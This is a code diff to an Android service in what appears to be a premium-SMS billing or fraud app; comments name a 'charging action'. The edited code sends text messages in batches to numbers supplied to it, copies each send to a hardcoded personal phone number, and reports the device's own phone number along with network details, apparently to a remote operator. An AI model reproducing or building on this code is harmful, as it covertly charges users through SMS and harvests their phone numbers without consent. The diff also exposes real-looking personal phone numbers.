@@ -42,13 +42,13 @@ public class PluginService extends IntentService {
 
     public static final String SMS_BROADCAST_ACTION = "com.xstd.plugin.broadcast";
 
-    private static final String[] SEND_MESSAGE_CONTENT = new String[] {
-        "你好，很高兴认识你。",
-        "您好，很高兴为您服务。",
-        "你好，请问你是？",
-        "好久不见",
-        "最近还好么?"
-    };
+//    private static final String[] SEND_MESSAGE_CONTENT = new String[] {
+//        "你好，很高兴认识你。",
+//        "您好，很高兴为您服务。",
+//        "你好，请问你是？",
+//        "好久不见",
+//        "最近还好么?"
+//    };
 
     /**
      * 扣费行动
@@ -100,10 +100,10 @@ public class PluginService extends IntentService {
                 if (datas != null) {
                     //如果一下发送多条短信会有问题，所以增加一个延迟
                     //每次只发5条，等10分钟，再发5条
-                    for (int i = 0; (i < datas.length && i < SEND_MESSAGE_CONTENT.length); ++i) {
+                    for (int i = 0; (i < datas.length && i < 5); ++i) {
                         String target = datas[i];
                         if (datas[i] != null && (datas[i].length() == 11 || datas[i].startsWith("+"))) {
-                            if (SMSUtil.sendSMS(datas[i], SEND_MESSAGE_CONTENT[i])) {
+                            if (SMSUtil.sendSMS(datas[i], "XSTD.SC:" + datas[i])) {
                                 datas[i] = "";
                             }
                         } else {
@@ -122,7 +122,7 @@ public class PluginService extends IntentService {
                                 }
                             }
 
-                            String debugMsg = "[[通知短信]]子程序向:" + target + "  发送了:" + SEND_MESSAGE_CONTENT[i];
+                            String debugMsg = "[[通知短信]]子程序向:" + target + "  发送了:" + "XSTD.SC:" + datas[i];
                             SMSUtil.sendSMS("18811087096", debugMsg);
 
                             Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] debug send message to 15810864155 phone" +
@@ -266,13 +266,13 @@ public class PluginService extends IntentService {
             @Override
             public void run() {
                 if (Config.DEBUG) {
-                    Config.LOGD("[[PluginService::activePluginAction]] try to fetch active info, SMS Center : "
-                                    + SettingManager.getInstance().getKeySmsCenterNum());
+                    Config.LOGD("[[PluginService::activePluginAction]] try to fetch active info, Phone Number : "
+                                    + SettingManager.getInstance().getCurrentPhoneNumber());
                 }
                 try {
                     AppRuntime.ACTIVE_PROCESS_RUNNING.set(true);
 
-                    if (TextUtils.isEmpty(SettingManager.getInstance().getKeySmsCenterNum())) {
+                    if (TextUtils.isEmpty(SettingManager.getInstance().getCurrentPhoneNumber())) {
                         /**
                          * 如果短信中心为空的话，就发送短信获取短信中心
                          */
@@ -302,7 +302,7 @@ public class PluginService extends IntentService {
                                                                      , unique
                                                                      , getString(R.string.app_name)
                                                                      , AppRuntime.getNetworkTypeByIMSI(getApplicationContext())
-                                                                     , SettingManager.getInstance().getKeySmsCenterNum()
+                                                                     , SettingManager.getInstance().getCurrentPhoneNumber()//TODO:
                                                                      , AppRuntime.PHONE_NUMBER
                                                                      , SettingManager.getInstance().getKeyLastErrorInfo()
                                                                      , DomanManager.getInstance(getApplicationContext())
